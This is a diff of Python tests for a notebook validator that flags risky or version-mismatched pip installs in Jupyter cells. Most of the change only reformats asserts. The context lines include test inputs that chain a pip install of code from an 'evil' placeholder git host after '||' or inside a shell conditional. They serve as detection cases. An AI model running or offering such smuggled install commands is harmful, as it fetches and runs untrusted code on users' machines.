@@ -899,12 +899,17 @@ def test_every_rule_reads_the_filtered_invocations():
         "!pip install foo || (pip install git+https://example.com/evil.git)",
         "!pip install foo || if command -v uv; then pip install git+https://example.com/evil.git; fi",
     ):
-        assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)), evil
+        assert any(
+            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
+        ), evil
 
     # Still line-scoped: the allowlist holds, and a line with no pip command is not an install.
-    assert nv.rule_inst_001_git_plus(
-        "!pip install git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_001_git_plus(
+            "!pip install git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
+        )
+        == []
+    )
     assert nv.rule_inst_001_git_plus('x = "git+https://example.com/evil.git"', "nb.ipynb", 0) == []
 
     source = (REPO_ROOT / "scripts" / "notebook_validator.py").read_text(encoding = "utf-8")
@@ -954,13 +959,16 @@ def test_notebook_validator_pads_the_minor_boundary():
         '!pip install "torchcodec>=0.10,<0.11.0"',
         '!pip install "torchcodec>=0.10,<0.11"',
     ):
-        assert len(
-            nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)
-        ) == 1, cell
+        assert (
+            len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1
+        ), cell
 
-    assert nv.rule_inst_004_torchcodec_torch(
-        '!pip install "torchcodec>=0.10,<0.12"', COLAB_TORCH211, "nb.ipynb", 0
-    ) == []
+    assert (
+        nv.rule_inst_004_torchcodec_torch(
+            '!pip install "torchcodec>=0.10,<0.12"', COLAB_TORCH211, "nb.ipynb", 0
+        )
+        == []
+    )
 
 
 def test_notebook_validator_reads_an_archive_given_as_a_path():
@@ -974,14 +982,22 @@ def test_notebook_validator_reads_an_archive_given_as_a_path():
         "/tmp/torchcodec-0.13.0-cp312-cp312-manylinux_2_28_x86_64.whl",
     ):
         assert nv._archive_requirement(path) == ("torchcodec", "0.13.0"), path
-        assert nv.rule_inst_004_torchcodec_torch(
-            f'!pip install "torch==2.12.0" {path}', COLAB_TORCH211, "nb.ipynb", 0
-        ) == [], path
+        assert (
+            nv.rule_inst_004_torchcodec_torch(
+                f'!pip install "torch==2.12.0" {path}', COLAB_TORCH211, "nb.ipynb", 0
+            )
+            == []
+        ), path
 
     stale = "./torchcodec-0.10.0-cp312-cp312-manylinux_2_28_x86_64.whl"
-    assert len(nv.rule_inst_004_torchcodec_torch(
-        f'!pip install "torch==2.12.0" {stale}', COLAB_TORCH211, "nb.ipynb", 0
-    )) == 1
+    assert (
+        len(
+            nv.rule_inst_004_torchcodec_torch(
+                f'!pip install "torch==2.12.0" {stale}', COLAB_TORCH211, "nb.ipynb", 0
+            )
+        )
+        == 1
+    )
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
